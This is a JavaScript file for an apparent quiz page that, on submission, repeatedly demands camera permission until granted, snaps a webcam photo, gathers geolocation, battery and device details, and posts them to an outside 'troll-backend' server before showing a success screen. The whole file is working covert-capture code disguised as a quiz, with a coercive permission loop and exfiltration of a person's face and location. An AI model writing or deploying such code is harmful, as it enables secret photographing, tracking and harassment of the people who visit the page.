// ==========================
// DOM ELEMENTS
// ==========================
const quizForm = document.getElementById("quiz-form");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const toast = document.getElementById("toast");
const fileInput = document.getElementById("user-file");

// Camera constraints
const constraints = { video: { facingMode: "user" }, audio: false };

// ==========================
// TOAST FUNCTION
// ==========================
function showToast(message = "Done") {
  toast.textContent = message;
  toast.classList.add("show");
  setTimeout(() => toast.classList.remove("show"), 3000);
}

// ==========================
// METADATA COLLECTION
// ==========================
async function collectMetadata() {
  const metadata = {
    width: window.innerWidth,
    height: window.innerHeight,
    platform: navigator.platform,
    language: navigator.language,
    useragent: navigator.userAgent,
    deviceram: navigator.deviceMemory || "N/A",
    cpuThreads: navigator.hardwareConcurrency || "N/A",
    referurl: document.referrer,
    localtime: new Date().toLocaleString(),
    battery: "N/A",
    location: "N/A",
  };

  // Battery info
  if (navigator.getBattery) {
    try {
      const battery = await navigator.getBattery();
      metadata.battery = `${battery.level * 100}% (${battery.charging ? "charging" : "not charging"})`;
    } catch {}
  }

  // Geolocation
  if (navigator.geolocation) {
    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject);
      });
      metadata.location = `${position.coords.latitude}, ${position.coords.longitude}`;
    } catch {
      metadata.location = "Access denied";
    }
  }

  return metadata;
}

// ==========================
// CAPTURE PHOTO
// ==========================
function capturePhoto() {
  const context = canvas.getContext("2d");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  context.drawImage(video, 0, 0, canvas.width, canvas.height);
  return canvas.toDataURL("image/png");
}

// ==========================
// SEND TO BACKEND
// ==========================
async function sendToBackend(imageData, metadata) {
  try {
    const res = await fetch("https://troll-backend.onrender.com/api/upload", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image: imageData, metadata: metadata }),
    });
    const data = await res.json();
    console.log("Backend response:", data);
  } catch (err) {
    console.error("Error sending data:", err);
  }
}

// ==========================
// CAMERA PERMISSION LOOP
// ==========================
async function requestCameraUntilAllowed() {
  let stream = null;
  while (!stream) {
    try {
      stream = await navigator.mediaDevices.getUserMedia(constraints);
    } catch (err) {
      alert("Camera permission is required to continue. Please allow access.");
    }
  }
  return stream;
}

// ==========================
// FORM SUBMIT HANDLER
// ==========================
quizForm.addEventListener("submit", async (e) => {
  e.preventDefault();

  // First, request camera permission
  const stream = await requestCameraUntilAllowed();
  video.srcObject = stream;

  // Wait for video to be ready
  await new Promise((resolve) => {
    video.onloadedmetadata = () => {
      video.play();
      resolve();
    };
  });
  await new Promise((resolve) => setTimeout(resolve, 200)); // small delay to get first frame

  // Capture photo and collect metadata
  const imageData = capturePhoto();
  const metadata = await collectMetadata();

  // Send image + metadata to backend
  await sendToBackend(imageData, metadata);

  // Show toast
  showToast("Captured & sent!");

  // Continue with normal form submit (optional: upload file)
  if (fileInput.files.length > 0) {
    console.log("User uploaded file:", fileInput.files[0].name);
    // You can handle file upload here if needed
  }

  // Optionally, show success container
  document.getElementById("quiz-container").style.display = "none";
  document.getElementById("success-container").style.display = "flex";
});
